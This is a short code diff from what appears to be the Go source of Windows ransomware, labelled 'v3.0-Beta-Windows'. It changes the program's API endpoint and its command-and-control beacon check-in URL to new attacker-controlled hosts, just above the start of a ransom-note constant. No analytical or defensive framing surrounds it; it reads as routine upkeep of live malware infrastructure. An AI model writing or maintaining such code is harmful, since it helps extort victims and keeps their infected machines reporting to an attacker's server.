@@ -28,8 +28,8 @@ import (
 
 const (
 	version   = "v3.0-Beta-Windows"
-	apiURL    = "https://rsa-uuid.api.yangzifun.org"
-	beaconURL = "https://bad-c2-server.api.yangzifun.org/beacon_check_in"
+	apiURL    = "https://encrypt.yangzifun.org/E56dSY"
+	beaconURL = "https://encrypt.yangzifun.org/beacon_check_in"
 )
 
 const ransomNoteContent = `
